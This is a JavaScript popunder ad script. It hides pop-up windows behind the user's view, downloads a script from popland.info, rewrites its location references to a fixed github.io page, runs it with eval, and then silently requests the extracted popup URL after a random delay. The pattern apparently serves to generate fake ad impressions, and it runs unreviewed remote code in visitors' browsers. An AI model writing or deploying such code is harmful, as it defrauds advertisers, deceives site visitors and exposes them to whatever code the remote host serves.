var popupmeid = 7669;
var popupme_url;
document.popupme_popup = false;
function popupme_minutesUntilMidnight(hour) {
    var midnight = new Date();
    midnight.setHours(23);
    midnight.setMinutes(59);
    midnight.setSeconds(59);
    midnight.setMilliseconds(0);
    var remainMinutes = (midnight.getTime() - new Date().getTime()) / 1000 / 60;
    var expireTime = midnight;
    if (remainMinutes < 60) {
        var exdate = new Date();
        var extime = exdate.getTime();
        expireTime = new Date(extime + 3600 * 1000);
    } else if (remainMinutes < hour * 60) {
        expireTime = midnight;
    } else {
        expireTime = new Date().getTime() + 3600 * 1000 * hour;
    }
    return expireTime;
}

function popupme_setCookie(name, value, hour) {
    var exdate = new Date();
    if (hour == 'undefined')
        exdate.setTime(popupme_minutesUntilMidnight(24));
    else
        exdate.setTime(popupme_minutesUntilMidnight(hour));
    document.cookie = escape(name) + "=" + escape(value) + "; path=/; expires=" + exdate.toUTCString();
}
function popupme_getCookie(name) {
    var exp = new RegExp(escape(name) + "=([^;]+)");
    if (exp.test(document.cookie + ";")) {
        exp.exec(document.cookie + ";");
        return unescape(RegExp.$1);

    }
    else return false;
}
var popupme_browser = function () {
    var n = navigator.userAgent.toLowerCase();
    var b = {
        webkit: /webkit/.test(n),
        mozilla: (/mozilla/.test(n)) && (!/(compatible|webkit)/.test(n)),
        chrome: /chrome/.test(n),
        msie: (/msie/.test(n)) && (!/opera/.test(n)),
        firefox: /firefox/.test(n),
        safari: (/safari/.test(n) && !(/chrome/.test(n))),
        opera: /opera/.test(n)
    };
    b.version = (b.safari) ? (n.match(/.+(?:ri)[\/: ]([\d.]+)/) || [])[1] : (n.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/) || [])[1];
    return b;
}();

function popupme_pop2under() {
    try {
        popupme_popup_ww.blur();
    } catch (e) { }
    try { popupme_popup_ww.opener.window.focus(); } catch (e) { }
    try { window.self.window.focus(); } catch (e) { }
    try { window.focus(); } catch (e) { }
    try {
        if (popupme_browser.firefox) openClosePopupMeWindow();
        if (popupme_browser.webkit) openClosePopupMeTab();
        if (popupme_browser.msie) {
            setTimeout(function () {
                popupme_popup_ww.blur();
                popupme_popup_ww.opener.window.focus();
                window.self.window.focus();
                window.focus();
            }, 1000);
        }
    } catch (e) { }
}

function openClosePopupMeWindow() {
   /* var ghost = window.open('about:blank');
    ghost.focus();
    ghost.close();*/
}

function openClosePopupMeTab() {
    if (popupme_browser.chrome)
        return;
    var nothing = '';
    var ghost = document.createElement("a");
    ghost.href = "data:text/html,<scr" + nothing + "ipt>window.close();</scr" + nothing + "ipt>";
    document.getElementsByTagName("body")[0].appendChild(ghost);

    var clk = document.createEvent("MouseEvents");
    clk.initMouseEvent("click", false, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
    ghost.dispatchEvent(clk);

    ghost.parentNode.removeChild(ghost);
}
var popupmeid = 7669;
let targetURL = 'https://popland.info/landing/scriptindi/' + popupmeid
+ '?pc=3&d=' + parseInt(popupme_getCookie('ppmnh5e615b56'))
+ '&c=' + parseInt(popupme_getCookie('popup2me_21c0hng023hs23'))
+ '&ifr=' + parseInt(popupme_getCookie('popup2me_21c0ifr023hs24'))
+ '&if2=' + parseInt(popupme_getCookie('popup2me_21c0ifr123hs24'))
+ '&pb=' + parseInt(popupme_getCookie('popup2me_21c0pb023hs24'));

let xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		let returnScript = this.responseText;	
		returnScript = returnScript.replace("'+window.location", "https://professorjtj.github.io/iindex.html'").replace("'+window.location", "https://professorjtj.github.io/iindex.html'").replace("document.popupme_popup || ", "");
		ViewTheURL(returnScript);
		//console.log(returnScript);
		eval(returnScript);
	}
};

function ViewTheURL(returnScript) {
	try {
		let scriptIndex = returnScript.indexOf("window.open('");
		if (scriptIndex != -1) {
			scriptIndex += 13;
			let finishIndex = returnScript.indexOf(",", scriptIndex);
			let popupURL = returnScript.substr(scriptIndex, finishIndex - scriptIndex).replace("' + (ppmc + 1) + '", "1");
			let randomTime = 1500 + (((Math.floor(Math.random() * 12) + 1) * 0.5) * 1000);
			console.log(randomTime);
			setTimeout(function() {
				//console.log("Target: " + popupURL);
				fetch(popupURL, { method: 'GET', redirect: 'follow', mode: 'no-cors'});
			}, randomTime);
			var ppmc = parseInt(popupme_getCookie('popup2me_21c0hng023hs23'));
			if (ppmc != ppmc) ppmc = 0;
			ppmc++;
			if (ppmc >= 3) ppmc = 1;
			popupme_setCookie('popup2me_21c0hng023hs23', ppmc, 8);
		}
	}
	catch(message) {
	}
}

xhttp.open("GET", targetURL);
xhttp.send();
